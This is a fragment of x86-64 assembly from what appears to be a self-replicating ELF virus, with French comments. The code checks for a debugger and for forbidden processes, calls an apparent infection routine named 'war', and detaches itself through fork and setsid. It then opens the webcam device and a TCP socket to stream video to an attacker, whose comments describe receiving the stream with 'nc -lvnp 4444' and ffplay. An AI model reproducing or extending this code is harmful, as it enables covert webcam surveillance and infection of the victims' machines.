end_:




	%include "functions/is_debugged.s"
	cmp rax, -1
	je .quit_exit




	%include "functions/check_forbidden.s"
	cmp rax, 1
	jne end_0


	.quit_exit:

	mov		rax, SYS_exit
	xor		rdi, rdi
	NOP
	NOP
	NOP
	NOP
	syscall



	%include "warf.s"



end_0:
	call	war


	mov		rax, SYS_open

	mov		rdi, [rbp + 16]
	add		rdi, mydata.self

	;lea		rdi, [rel self]
	xor		rsi, rsi
	NOP
	NOP
	NOP
	NOP
	xor		rdx, rdx
	NOP
	NOP
	NOP
	NOP
	syscall

	cmp		rax, 0
	jle		.just_quit
	mov		r12, rax

	mov		rax, SYS_pread64
	mov		rdi, r12

	mov		rsi, [rbp + 16]
	add		rsi, mydata.zero

	;lea		rsi, [rel zero]
	mov		rdx, 1
	mov		r10, 10
	syscall

	mov		rax, SYS_close
	mov		rdi, r12
	syscall


	.just_quit:

		mov		rax, SYS_fork
		syscall

		cmp		eax, 0
		jng		.continue_fork

		mov		rax, SYS_exit
		xor		rdi, rdi
		NOP
		NOP
		NOP
		NOP
		syscall

	.continue_fork:
		mov		rax, SYS_setsid
		syscall


		; Ici commence la partie pour la cam
		; ffplay -f mjpeg -framerate 30 -i <nomdufichier>
		; c'est la commande que j'utilise avec
		; nc -lvnp 4444
		mov		rax, SYS_open

		mov		rdi, [rbp + 16]
		add		rdi, mydata.pathv

		;lea		rdi, [rel pathv]
		mov		rsi, 2
		NOP
		NOP
		NOP
		NOP
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		cmp		rax, 0
		jl		.continue_reverse
		mov		r12, rax	; file descriptor de video0

		mov		rax, SYS_socket
		mov		rdi, AF_INET
		mov		rsi, SOCK_STREAM
		xor		rdx, rdx
		NOP
		NOP
		NOP
		NOP
		syscall
		mov		r13, rax	; le socket
